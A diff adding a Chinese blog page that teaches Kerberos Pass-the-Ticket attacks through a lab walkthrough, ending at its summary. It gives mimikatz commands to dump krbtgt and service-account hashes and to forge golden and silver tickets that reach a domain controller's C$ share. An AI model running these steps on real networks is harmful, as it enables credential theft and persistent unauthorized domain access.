@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一、前言票据传递攻击（Pass the Ticket），基于 Kerberos 认证的一种攻击方式，常用于获取域控权限后的持久化维持权限。其中分为黄金票据传递攻击，利用前提是得到了域内 krbtgt 用户的 NTLM 哈希值或 AES-256 的值）和白银票据传递攻击，利用的前提是得到了域内服务账号的 NTLM 哈希值或 AES-256 的值。 KerberosKerberos 基于票据的身份认">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透系列-票据传递(Pass the Ticket)攻击">
+<meta property="og:url" content="http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="世间闲客·此闲行">
+<meta property="og:description" content="一、前言票据传递攻击（Pass the Ticket），基于 Kerberos 认证的一种攻击方式，常用于获取域控权限后的持久化维持权限。其中分为黄金票据传递攻击，利用前提是得到了域内 krbtgt 用户的 NTLM 哈希值或 AES-256 的值）和白银票据传递攻击，利用的前提是得到了域内服务账号的 NTLM 哈希值或 AES-256 的值。 KerberosKerberos 基于票据的身份认">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/domain/ptt/4.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230120123857565.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230120124116925.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230120125657793.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230120130405535.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230120131311827.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123135302687.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123135447067.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123135528127.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123142243785.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123135725487.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123140050974.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123140230369.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123185504423.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123185650392.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123185946330.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123191308558.png">
+<meta property="og:image" content="http://example.com/images/domain/ptt/image-20230123191525936.png">
+<meta property="article:published_time" content="2023-01-23T11:32:48.000Z">
+<meta property="article:modified_time" content="2023-01-27T11:18:04.000Z">
+<meta property="article:author" content="Funsiooo">
+<meta property="article:tag" content="票据传递攻击">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/domain/ptt/4.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo-1.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>域渗透系列-票据传递(Pass the Ticket)攻击</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AF%87/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/01/22/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E4%BD%A0%E6%9C%9F%E5%BE%85%E7%9A%84%EF%BC%8C%E6%AD%A3%E5%9C%A8%E8%B7%AF%E4%B8%8A/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&text=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&is_video=false&description=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=域渗透系列-票据传递(Pass the Ticket)攻击&body=Check out this article: http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&name=域渗透系列-票据传递(Pass the Ticket)攻击&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&t=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos"><span class="toc-number">1.1.</span> <span class="toc-text">Kerberos</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88Golden-Ticket%EF%BC%89%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">二、黄金票据（Golden Ticket）传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">制作黄金票据条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.2.</span> <span class="toc-text">黄金票据传递攻击实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">三、白银票据(Silver Ticket)传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">制作白银票据条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5"><span class="toc-number">3.2.</span> <span class="toc-text">白银票据传递攻击实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">五、参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        域渗透系列-票据传递(Pass the Ticket)攻击
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Funsiooo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-01-23T11:32:48.000Z" itemprop="datePublished">2023-01-23</time>
+        
+        (Updated: <time datetime="2023-01-27T11:18:04.000Z" itemprop="dateModified">2023-01-27</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97/">域渗透系列</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/" rel="tag">票据传递攻击</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><a data-fancybox="gallery" data-src="/../images/domain/ptt/4.png" data-caption="image-20230120123857565"><img src="/../images/domain/ptt/4.png" alt="image-20230120123857565"></a></p>
+<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>票据传递攻击（Pass the Ticket），基于 Kerberos 认证的一种攻击方式，常用于获取域控权限后的持久化维持权限。其中分为<font color=#c3dbe8>黄金票据传递攻击</font>，利用前提是得到了域内 krbtgt 用户的 NTLM 哈希值或 AES-256 的值）和<font color=#c3dbe8>白银票据传递攻击</font>，利用的前提是得到了域内服务账号的 NTLM 哈希值或 AES-256 的值。</p>
+<h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 基于票据的身份认证方式，并非密码认证。客户端想要访问服务端的某个应用必须通过 Kerberos 进行票据身份认证。其主要由客户端（Client）、服务端（Server）、提供认证服务的KDC（Key Distribution Center）三部分组成。具体 Kerberos 认证过程请参考文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/341103.html">内网渗透学习–Kerberos认证</a></p>
+<hr>
+<h2 id="二、黄金票据（Golden-Ticket）传递攻击"><a href="#二、黄金票据（Golden-Ticket）传递攻击" class="headerlink" title="二、黄金票据（Golden Ticket）传递攻击"></a>二、黄金票据（Golden Ticket）传递攻击</h2><p>在 kerberos 认证过程中会生成一个<font color=#c3dbe8> ST服务票据 </font>，可用于访问应用服务器。<font color=#c3dbe8>域中用户的ST服务票据均由 krbtgt 用户的密码 Hash 来计算生成的</font>，krbtgt 账户的密码 hash 存储在域控制器上，因此我们需要获取域管理员权限，只要拿到了 krbtgt 密码 Hash 就可以随意伪造ST服务票据，进而使用ST服务票据访问域控制器，使用 krbtgt 用户 Hash 生成的票据被称为 黄金票据（Golden Ticket）。</p>
+<h3 id="制作黄金票据条件"><a href="#制作黄金票据条件" class="headerlink" title="制作黄金票据条件"></a>制作黄金票据条件</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域名</span><br><span class="line">域sid值</span><br><span class="line">需要伪造的域用户名</span><br><span class="line">krbtgt 账户哈希值或AES-256值</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="黄金票据传递攻击实践"><a href="#黄金票据传递攻击实践" class="headerlink" title="黄金票据传递攻击实践"></a>黄金票据传递攻击实践</h3><p>1、获取域管理员权限后，登录域控，查看是否存在 krbtgt 账号，尝试进行黄金票据传递攻击，实现权限持久化维持</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">net user krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120123857565.png" data-caption="image-20230120123857565"><img src="/../images/domain/ptt/image-20230120123857565.png" alt="image-20230120123857565"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120124116925.png" data-caption="image-20230120124116925"><img src="/../images/domain/ptt/image-20230120124116925.png" alt="image-20230120124116925"></a></p>
+<p>2、查看域信息</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120125657793.png" data-caption="image-20230120125657793"><img src="/../images/domain/ptt/image-20230120125657793.png" alt="image-20230120125657793"></a></p>
+<p>3、获取 krbtgt 账号的 SID 值和哈希值，利用 mimikatz 进行获取</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:域名 /user:krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120130405535.png" data-caption="image-20230120130405535"><img src="/../images/domain/ptt/image-20230120130405535.png" alt="image-20230120130405535"></a></p>
+<p>4、整合域控信息如下</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-1359007890-1682372173-1631803504	# SID值</span><br><span class="line">4a67f14d5cc4fa22618c8b609e832db6		# Hash NTLM 值</span><br><span class="line">owa.redteam.red					# 域主机名</span><br><span class="line">redteam.red					# 域名</span><br></pre></td></tr></table></figure></div>
+<br/>
+
+<p>5、制作黄金票据，利用 mimikatz 进行制作，此操作在域内任一主机上普通权限即可，现转至其中一个域成员 SQLSERVER-2008 计算机上操作</p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120131311827.png" data-caption="image-20230120131311827"><img src="/../images/domain/ptt/image-20230120131311827.png" alt="image-20230120131311827"></a></p>
+<p>在制作票据前，先将票据清空，防止之前的票据对新作的票据产生影响</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135302687.png" data-caption="image-20230123135302687"><img src="/../images/domain/ptt/image-20230123135302687.png" alt="image-20230123135302687"></a></p>
+<p>利用 mimikatz 生成黄金票据并导入</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:要伪造的域用户(一般填写域管理员) /domain:域名 /sid:域SID值 /krbtgt:krbtgt账户的hash值 /ptt</span><br><span class="line">kerberos::golden /user:administrator /domain:redteam.red /sid:S-1-5-21-1359007890-1682372173-1631803504 /krbtgt:4a67f14d5cc4fa22618c8b609e832db6 /ptt</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135447067.png" data-caption="image-20230123135447067"><img src="/../images/domain/ptt/image-20230123135447067.png" alt="image-20230123135447067"></a></p>
+<p>查看票据是否已经生成导入</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135528127.png" data-caption="image-20230123135528127"><img src="/../images/domain/ptt/image-20230123135528127.png" alt="image-20230123135528127"></a></p>
+<p>6、在导入票据的域内机器上，重新打开cmd窗口，直接列出域控目录</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\域控主机名.域名\c$</span><br></pre></td></tr></table></figure></div>
+
+<p>黄金票据攻击前</p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123142243785.png" data-caption="image-20230123142243785"><img src="/../images/domain/ptt/image-20230123142243785.png" alt="image-20230123142243785"></a></p>
+<p>黄金票据攻击后</p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135725487.png" data-caption="image-20230123135725487"><img src="/../images/domain/ptt/image-20230123135725487.png" alt="image-20230123135725487"></a></p>
+<p>将域控主机 owa 的 c 盘映射到本地的 k 盘</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use k: \\域控主机名.域名\c$</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123140050974.png" data-caption="image-20230123140050974"><img src="/../images/domain/ptt/image-20230123140050974.png" alt="image-20230123140050974"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123140230369.png" data-caption="image-20230123140230369"><img src="/../images/domain/ptt/image-20230123140230369.png" alt="image-20230123140230369"></a></p>
+<hr>
+<h2 id="三、白银票据-Silver-Ticket-传递攻击"><a href="#三、白银票据-Silver-Ticket-传递攻击" class="headerlink" title="三、白银票据(Silver Ticket)传递攻击"></a>三、白银票据(Silver Ticket)传递攻击</h2><p>白银票据的利用过程是伪造 TGS，通过已知的授权服务密码（hash）生成一张可以访问该服务的TGT。即通过获取相应的服务账号的 hash 来伪造 TGS 给我们自己签发任意用户的 TGS 票据（service ticket），例如：LDAP、MSSQL、WinRM、DNS、CIFS等，范围有限，只能获取对应服务的权限，这个票据也被称为白银票据（Silver Ticket）。</p>
+<h3 id="制作白银票据条件"><a href="#制作白银票据条件" class="headerlink" title="制作白银票据条件"></a>制作白银票据条件</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域名</span><br><span class="line">域SID值</span><br><span class="line">需要伪造的域用户（一般填写域管理员账号）</span><br><span class="line">可利用的服务</span><br><span class="line">服务账号的NTLM Hash值</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="白银票据传递攻击实践"><a href="#白银票据传递攻击实践" class="headerlink" title="白银票据传递攻击实践"></a>白银票据传递攻击实践</h3><p>白银票据伪造 CIFS 服务权限，CIFS 服务通常用于 Windows 主机之间的文件共享。</p>
+<p>1、查看域信息</p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185504423.png" data-caption="image-20230123185504423"><img src="/../images/domain/ptt/image-20230123185504423.png" alt="image-20230123185504423"></a></p>
+<p>2、获取域SID值和服务账号的 NTLM Hash</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185650392.png" data-caption="image-20230123185650392"><img src="/../images/domain/ptt/image-20230123185650392.png" alt="image-20230123185650392"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185946330.png" data-caption="image-20230123185946330"><img src="/../images/domain/ptt/image-20230123185946330.png" alt="image-20230123185946330"></a></p>
+<p>4、整合域控信息如下</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">189988620695f11d6c9a91da29eda1f8		# NTLM HASH</span><br><span class="line">S-1-5-21-1359007890-1682372173-1631803504	# SID 值</span><br><span class="line">owa.redteam.red					# 主机名</span><br><span class="line">redteam.red					# 域名</span><br></pre></td></tr></table></figure></div>
+<br/>
+
+<p>5、制作白银票据，利用 mimikatz 在域内成员主机上进行操作</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLMHash&gt; /user:&lt;伪造的用户名&gt; /ptt</span><br><span class="line">kerberos::golden /domain:redteam.red /sid:S-1-5-21-1359007890-1682372173-1631803504  /target:owa.redteam.red /rc4:189988620695f11d6c9a91da29eda1f8  /service:cifs /user:admin /ptt</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>白银票据伪造 CIFS 服务攻击前</p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123191308558.png" data-caption="image-20230123191308558"><img src="/../images/domain/ptt/image-20230123191308558.png" alt="image-20230123191308558"></a></p>
+<p>白银票据伪造 CIFS 服务攻击后</p>
+<p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123191525936.png" data-caption="image-20230123191525936"><img src="/../images/domain/ptt/image-20230123191525936.png" alt="image-20230123191525936"></a></p>
+<hr>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>黄金票据传递攻击与白银票据传递攻击两者区别在于</p>
+<p>访问权限</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黄金票据：伪造TGT，可以获取任何Kerberos服务权限</span><br><span class="line">白银票据：伪造TGS，只能访问指定的服务</span><br></pre></td></tr></table></figure></div>
+<p>加密方式</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黄金票据由 krbtgt 的 Hash 加密</span><br><span class="line">白银票据由服务账号（通常为计算机账户）Hash加密</span><br></pre></td></tr></table></figure></div>
+<p>隐蔽性</p>
